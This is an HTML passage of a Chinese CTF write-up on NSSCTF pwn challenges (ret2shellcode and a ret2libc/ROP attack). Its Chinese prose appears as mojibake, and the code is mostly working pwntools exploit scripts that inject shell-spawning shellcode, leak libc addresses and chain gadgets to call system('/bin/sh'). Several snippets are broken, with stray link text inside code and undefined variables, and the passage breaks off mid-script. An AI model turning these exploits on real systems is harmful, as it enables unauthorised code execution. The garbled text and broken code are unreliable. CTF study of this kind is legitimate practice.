</div><p>è¿™é‡Œä¸ç”¨system=elf.sym[&lsquo;system&rsquo;]çš„åŸå› æ˜¯æˆ‘åœ¨è¯»æ±‡ç¼–æ—¶æ°å¥½çœ‹åˆ°è¿™ä¸ªsystemåœ°å€ï¼Œç›´æ¥ç”¨ç¡¬ç¼–ç åœ°å€æ›´å‡†ç¡®ã€‚</p>
<h2 id="ret2shellcode">ret2shellcode
</h2><p><a class="link" href="PWN-7" >PWN-7</a></p>
<p>checksecç»“æœä¾æ—§ä¸€æ ·&hellip;ä¸å±•ç¤ºäº†ã€‚</p>
<p>IDA64ä½åˆ†æï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/24.png"
	width="760"
	height="225"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/24_hu_9092381450c5e42c.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/24_hu_5dd9c793da5ac858.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="337"
		data-flex-basis="810px"
	
></p>
<blockquote>
<p>v3 = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);</p>
<p>åˆ†é…ä¸€å— 4KBï¼ˆ0x1000 å­—èŠ‚ï¼‰çš„å†…å­˜åŒºåŸŸ;ç¬¬ä¸‰ä¸ªå‚æ•°<code>7</code>ï¼šå†…å­˜æƒé™ä¸º `PROT_READï¼Œæ„å‘³ç€å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œ<strong>å¾€é‡Œè¾¹æ³¨å…¥shellcodeä¹Ÿèƒ½æ‰§è¡Œ</strong>ã€‚</p>
</blockquote>
<p>æœ‰readå‡½æ•°ï¼Œè¯»å–0x1000é•¿åº¦åˆ°v3ä¸­ï¼Œ<code>mmap</code>ç›´æ¥åˆ†é…äº†<code>PROT_EXEC</code>æƒé™çš„å†…å­˜ï¼Œæ— éœ€é€šè¿‡æ¼æ´ç»•è¿‡æƒé™é™åˆ¶ï¼Œé€šè¿‡mmapå‡½æ•°åˆ†é…å†…å­˜ï¼Œæ™®é€šç¨‹åºä¸­æ³¨å…¥ shellcode å¸¸å—é™åˆ¶ï¼ˆå¦‚æ ˆä¸å¯æ‰§è¡Œ<code>NX</code>ã€å†…å­˜æƒé™ä¸è¶³ï¼‰ï¼Œä½†è¿™æ®µä»£ç ä¸»åŠ¨æ¶ˆé™¤äº†æ‰€æœ‰éšœç¢ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">25024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ret2sys">ret2sys
</h2><p><a class="link" href="main.zip" >main.zip</a></p>
<p>checksecï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/25.png"
	width="624"
	height="180"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/25_hu_77dd046e2dc90488.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/25_hu_881bd2d53c7e396c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="346"
		data-flex-basis="832px"
	
></p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/26.png"
	width="700"
	height="201"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/26_hu_2150777b011d1b61.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/26_hu_825198bf1d4730c8.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="348"
		data-flex-basis="835px"
	
></p>
<p>æ²¡å¼€canaryä¿æŠ¤ï¼Œé‚£å°±å‡ºç°æ ˆæº¢å‡ºæ¼æ´ï¼Œå¡«å……0x30+8ã€‚</p>
<p>shift+F12çœ‹åˆ°å­—ç¬¦ä¸²è¿™ä¸€æ ï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/27.png"
	width="1459"
	height="436"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/27_hu_b1277ca50b7bb502.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/27_hu_1946eb83fd575417.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="334"
		data-flex-basis="803px"
	
></p>
<p>å‘ç°æ²¡æœ‰systemå‡½æ•°ï¼Œä½†æˆ‘ä»¬éœ€è¦æ„é€ å‡º<code>system(&quot;/bin/sh&quot;);</code>è¿™ä¸ªå‡½æ•°æ ·å¼ï¼Œåˆå› ä¸ºé¢˜ç›®ç»™äº†æˆ‘ä»¬æœ‰ä¸ªæ ‡å‡†libc.so.6çš„æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å¤§è‡´æ€è·¯å°±æ˜¯ä»é‡Œè¾¹è·å–systemç­‰ä¸€äº›èƒ½getshellå‡½æ•°ï¼Œå› ä¸ºæœ‰åç§»é‡ï¼Œæ‰€ä»¥è¯´éœ€è¦å…ˆæ³„éœ²è¿™ä¸ªé¢˜ç›®ç¨‹åºçš„åœ°å€è·å–åŸºåœ°å€ï¼Œç„¶åæ‰èƒ½åæ¨å‡ºsystemåœ¨è¿™ä¸ªç¨‹åºçš„çœŸå®åœ°å€ï¼Œè¿™æ ·å°±èƒ½æ‰§è¡Œsystemå‡½æ•°ï¼Œå†æ„é€ ROPæ”»å‡»é“¾ã€‚</p>
<p>å¤§è‡´æ¡†æ¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node7.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">20072</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./main&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> 
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³„éœ²åœ°å€ï¼Œåœ¨mainå‡½æ•°åˆ†æå¾—çŸ¥ï¼Œæˆ‘ä»¬åªèƒ½æ³„éœ²putså‡½æ•°äº†ã€‚</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/28.png"
	width="1080"
	height="210"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/28_hu_54f13dac2b364593.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/28_hu_4ab2f8bfea059847.png 1024w"
	loading="lazy"
	
		alt="puts@got.plt:0x404018"
	
	
		class="gallery-image" 
		data-flex-grow="514"
		data-flex-basis="1234px"
	
></p>
<p>ROPé“¾æ„é€ ï¼Œç”¨pop_rdiä¼ å‚ã€‚</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/29.png"
	width="1045"
	height="149"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/29_hu_df3d7ad4424a15ee.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/29_hu_d7b0c3c2454ee5b9.png 1024w"
	loading="lazy"
	
		alt="pop_rdi:0x000000000040122b"
	
	
		class="gallery-image" 
		data-flex-grow="701"
		data-flex-basis="1683px"
	
></p>
<p>payload1ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node7.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">20072</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./main&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./main&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span><span class="o">=</span><span class="mh">0x401030</span> <span class="c1">#IDAä¸Šå¯ä»¥æ‰¾åˆ°</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040122b</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#æ‰§è¡Œmainå‡½æ•°ä¸ä¼šè®©ç¨‹åºä¸‹çº¿ï¼Œä»è€Œèƒ½ç»§ç»­ä¸Šä¼ åç»­çš„payload2.</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬ç”¨putså‡½æ•°æœ¬èº«å»æŠŠå®ƒè‡ªå·±å‡½æ•°åœ°å€æ‰“å°å‡ºæ¥ï¼Œç”¨u64æ¥æ”¶ä¿å­˜åˆ°ä¸€ä¸ªå˜é‡ä¸Šï¼Œæ­¤æ—¶putsçœŸå®åœ°å€æ³„éœ²äº†ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç”¨libc.so.6å»æ³„éœ²å‡ºåç§»é‡ï¼Œç„¶åå¾—åˆ°æœ¬ç¨‹åºå…¶ä»–å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">puts_read_address</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_read_address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>libc_baseå·²ç»æ³„éœ²äº†ï¼Œé‚£æˆ‘ä»¬åæ¨å‡º/bin/shåœ°å€ï¼š</p>
<p>å½“ç„¶ä¸æ˜¯å¾ˆç†Ÿæ‚‰PWNçš„å¯ä»¥å•ç‹¬è¿è¡Œï¼Œé«˜æ‰‹å¯ä»¥ç›´æ¥å¼•å…¥<code>binsh_offset = next(libc.search(b&quot;/bin/sh&quot;))</code>ï¼Œçœå»å¤åˆ¶ç²˜è´´ğŸ˜„ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_offset</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">binsh_offset</span><span class="p">))</span>  
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/30.png"
	width="845"
	height="243"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/30_hu_c172e8517b021d54.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/30_hu_d3c04b8c36d9fee.png 1024w"
	loading="lazy"
	
		alt="/bin/shï¼š0x1b75aa"
	
	
		class="gallery-image" 
		data-flex-grow="347"
		data-flex-basis="834px"
	
></p>
<p>systemå‡½æ•°æˆ‘ä»¬ç›´æ¥ç”¨libcæŸ¥æ‰¾åˆ°åç§»é‡ï¼Œå†åŠ ä¸Šæˆ‘ä»¬ä¹‹å‰æ³„éœ²å‡ºæ¥çš„åŸºåœ°å€libc_baseå°±å¥½ã€‚</p>
<p>fake_payload2ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¬¸ä¸å¯¹&hellip;è¿™å¯æ˜¯x86-64æ¶æ„ï¼è¿˜æ²¡æœ‰æ ˆå¯¹é½å‘¢ï¼Œ0x30+8ä¸æ˜¯16æ•´æ•°ï¼Œæ‰€ä»¥éœ€è¦æ ˆå¯¹é½ï¼Œæ‰§è¡Œä¸€ä¸‹retè¿”å›ä¸€ä¸‹ï¼Œå¯ä»¥ç”¨ROPgadgetæŸ¥ï¼Œæˆ‘ç›´æ¥ç»™retï¼š0x401016ï¼Œå½“ç„¶å¯ä»¥ç”¨pop_rdi+1ã€‚</p>
<p>payload2:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#ret = 0x401016</span>
</span></span><span class="line"><span class="cl"><span class="c1">#payload2 = cyclic(0x30+8) + p64(ret) + p64(pop_rdi) + p64(binsh+libc_base) + p64(libc_base + libc.sym[&#34;system&#34;])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·ï¼Ÿ<code>pop_rdi + 1</code> æŒ‡å‘çš„æ˜¯ <code>pop_rdi</code> gadget ä¸­ <code>ret</code> æŒ‡ä»¤çš„åœ°å€ï¼ˆè·³è¿‡å‰é¢çš„ <code>pop rdi</code> æŒ‡ä»¤ï¼‰ã€‚æ‰§è¡Œè¿™ä¸ªåœ°å€æ—¶ï¼Œåªä¼šæ‰§è¡Œ <code>ret</code> æŒ‡ä»¤ï¼Œä½œç”¨æ˜¯<strong>å¤šä¸€æ¬¡æ ˆæŒ‡é’ˆè°ƒæ•´</strong>ï¼Œè®©æ ˆå¯¹é½åˆ° 16 å­—èŠ‚ï¼Œçœå»ä½ å»æŸ¥å•ç‹¬çš„retçš„gadgetåœ°å€äº†ã€‚</p>
<p>é‚£ä¹ˆexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="p">[</span><span class="n">P9</span><span class="o">.</span><span class="n">zip</span><span class="p">](</span><span class="n">P9</span><span class="o">.</span><span class="n">zip</span><span class="p">)</span>  <span class="p">[</span><span class="n">P9</span><span class="o">.</span><span class="n">zip</span><span class="p">](</span><span class="n">P9</span><span class="o">.</span><span class="n">zip</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io=process(&#34;./main&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">27473</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./main&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x40122b</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span><span class="o">=</span><span class="mh">0x1b75aa</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span><span class="o">=</span><span class="mh">0x401030</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_read_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_read_address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_read_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x401016</span>
</span></span><span class="line"><span class="cl"><span class="c1">#payload2 = cyclic(0x30+8) + p64(ret) + p64(binsh + libc_base) + p64(libc_base+libc.sym[&#34;system&#34;])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x30</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>  <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
